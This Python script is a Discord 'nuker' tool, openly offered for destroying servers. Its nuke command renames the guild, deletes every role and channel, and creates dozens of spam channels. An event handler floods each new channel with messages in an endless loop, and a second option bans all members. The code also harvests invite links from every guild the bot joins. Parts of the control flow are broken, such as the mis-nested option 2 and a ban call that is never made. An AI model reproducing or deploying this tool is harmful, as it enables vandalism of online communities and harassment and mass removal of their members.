import sys
import colorama
from colorama import Fore
import pystyle
from pystyle import Write, Colors
import os
from os import system, name
from time import sleep
import discord
from discord.ext import commands
import ctypes
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="$", intents=intents)

w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
   
global cls
def cls():
 os.system('cls' if os.name=='nt' else 'clear')

def tool():
  os.system('cls' if os.name=='nt' else 'clear')

def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')

clear = lambda: os.system('cls')

os.chdir("c:\Icon\Coding\Python\Protocol Nuker V2")

colorama.init()
 
system('mode con: cols=121 lines=22')

ctypes.windll.kernel32.SetConsoleTitleW("ALPHA Nuker V1.0 - Made by Protocol")

print('')
print('')

Write.Print("                                   $$$$$$\  $$\       $$$$$$$\  $$\   $$\  $$$$$$\  \n", Colors.red_to_purple, interval=0.000)            
Write.Print("                                  $$  __$$\ $$ |      $$  __$$\ $$ |  $$ |$$  __$$\ \n", Colors.red_to_purple, interval=0.000)            
Write.Print("                                  $$ /  $$ |$$ |      $$ |  $$ |$$ |  $$ |$$ /  $$ | \n", Colors.red_to_purple, interval=0.000)           
Write.Print("                                  $$$$$$$$ |$$ |      $$$$$$$  |$$$$$$$$ |$$$$$$$$ | \n", Colors.red_to_purple, interval=0.000)             
Write.Print("                                  $$  __$$ |$$ |      $$  ____/ $$  __$$ |$$  __$$ | \n", Colors.red_to_purple, interval=0.000)            
Write.Print("                                  $$ |  $$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ | \n", Colors.red_to_purple, interval=0.000)
Write.Print("                                  $$ |  $$ |$$$$$$$$\ $$ |      $$ |  $$ |$$ |  $$ | \n", Colors.red_to_purple, interval=0.000)
Write.Print(">[Github.com/Protocol999]         \__|  \__|\________|\__|      \__|  \__|\__|  \__| \n", Colors.red_to_purple, interval=0.000)
Write.Print(">[Protocol#6119]                                                                           \n", Colors.red_to_purple, interval=0.000)
Write.Print("═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.red_to_purple, interval=0.000)
print(f'''{m}'''.replace('$', f'{m}${w}') + f'''
{m}[{w}1{Fore.RESET}{m}]{Fore.RESET} Server Nuker - Destroys A Server Completely By Deleting/Creating Channels, Spamming Messages (close terminal to stop)
{m}[{w}2{Fore.RESET}{m}]{Fore.RESET} Ban All Members - Ban All Members (open a new terminal to run this if your currently using one to nuke)
{m}[{w}3{Fore.RESET}{m}]{Fore.RESET}{lr} EXIT - Exit The Nuker{Fore.RESET}''')
Write.Print("═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.red_to_purple, interval=0.000)
choice = input(f'{m}[{w}>{m}]{w} Choice: ')
if choice == '1':
#       intents = discord.Client(intents=discord.Intents().all())
#       width = os.get_terminal_size().columns
        def menu():
                token = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Bot token : ")
                f = open("utilities/Plugins/ignore/.token", "w")
                f.write(token)
                f.close()

                prefix = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot prefix : ")
                f = open("utilities/Plugins/ignore/.prefix", "w")
                f.write(prefix)
                f.close()

                spammessage = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Spam message : ")
                f = open("utilities/Plugins/ignore/.message", "w")
                f.write(spammessage)
                f.close()

                channelsname = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Channels name : ")
                f = open("utilities/Plugins/ignore/.channelsname", "w")
                channelsname = channelsname.lower()
                channelsname.replace("", "-")
                f.write(channelsname)
                f.close()
                main()

        def main():
    
            prefix = open("utilities/Plugins/ignore/.prefix", "r")
            prefix = prefix.read()

            token = open("utilities/Plugins/ignore/.token", "r")
            token = token.read()

            channelsname = open("utilities/Plugins/ignore/.channelsname", "r")
            channelsname = channelsname.read()

            spammessage = open("utilities/Plugins/ignore/.message", "r")
            spammessage = spammessage.read()

            bot = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
            bot.remove_command('help')

            @bot.event
            async def on_ready():
                if len(bot.guilds) > 1:
                    guildpl = "guilds"
                else:
                    guildpl = "guild"
                activity = discord.Game(name=f"Alpha Nuker", type=3)
                await bot.change_presence(status=discord.Status.dnd, activity=activity)
                clear()
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot : {bot.user} ({len(bot.guilds)} {guildpl})")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Prefix : {prefix}")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Spam message : {spammessage}")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Channels name : {channelsname}")
                print(f"")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] type: {prefix}nuke in a channel")
                print(f"")

            @bot.event
            async def on_guild_channel_create(channel):
                while True:
                    await channel.send(spammessage)
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent : {spammessage}")

            @bot.event
            async def on_guild_join(guild):
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite()
                        break
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Joined Guild : {guild.name} ({guild.id}) {invite}")

            @bot.command()
            async def nuke(ctx):
                await ctx.message.delete()
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Nuking {ctx.guild.name} ({ctx.guild.id})...")
                await ctx.guild.edit(name="Alpha Nuker Runs Discord")
                for role in ctx.guild.roles:
                    try:
                        await role.delete()
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: @{role.name}")
                    except:
                        pass
                        print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: @{role.name}")

                for channel in ctx.guild.channels:
                    try:
                        await channel.delete()
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: #{channel.name}")
                    except:
                        pass
                        print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: #{channel.name}")
                try:
                    for i in range(50):
                        await ctx.guild.create_text_channel(channelsname)
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created: #{channel.name}")
                except Exception as er:
                    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error: {er}")
            try:
                bot.run(token)
            except Exception as er:
                pass
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")
                input()
        if choice=='2':


         def menu():
                token = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Bot token : ")
                f = open("utilities/Plugins/ignore/.token", "w")
                f.write(token)
                f.close()

                prefix = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot prefix : ")
                f = open("utilities/Plugins/ignore/.prefix", "w")
                f.write(prefix)
                f.close()
                main()

        def main():
    
            prefix = open("utilities/Plugins/ignore/.prefix", "r")
            prefix = prefix.read()
            token = open("utilities/Plugins/ignore/.token", "r")
            token = token.read()

            bot = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
            bot.remove_command('help')

            @bot.event
            async def on_ready():
                if len(bot.guilds) > 1:
                    guildpl = "guilds"
                else:
                    guildpl = "guild"
                activity = discord.Game(name=f"Alpha Nuker", type=3)
                await bot.change_presence(status=discord.Status.dnd, activity=activity)
                clear()
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot : {bot.user} ({len(bot.guilds)} {guildpl})")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Prefix : {prefix}")
                print(f"")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] type: {prefix}banall in a channel")
                print(f"")
        
        @bot.command()
        async def banall(ctx):
         for member in ctx.guild.members:
           if member==ctx.author or member==bot.user:
            print('(-) could not ban user')
           else:
               await member.ban
               print('(-) member banned')
        while True:
            menu()



